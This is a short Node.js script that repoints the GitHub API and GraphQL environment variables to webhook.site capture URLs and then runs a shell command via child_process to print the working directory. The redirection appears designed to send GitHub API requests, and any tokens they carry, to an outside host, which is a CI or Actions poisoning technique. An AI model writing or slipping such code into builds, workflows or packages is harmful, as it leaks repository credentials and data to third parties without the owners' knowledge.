process.env['GITHUB_API_URL']="webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/gitapi"

process.env['GITHUB_GRAPHQL_URL'] = "webhook.site/71b83533-c42f-4b16-91e7-f34de8e97a03/graphqlapi"
//console.log( process.env );
const { exec } = require('child_process');
// Execute the 'ls' command
exec('pwd', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Stderr: ${stderr}`);
    return;
  }
  console.log(`Stdout: ${stdout}`);
});
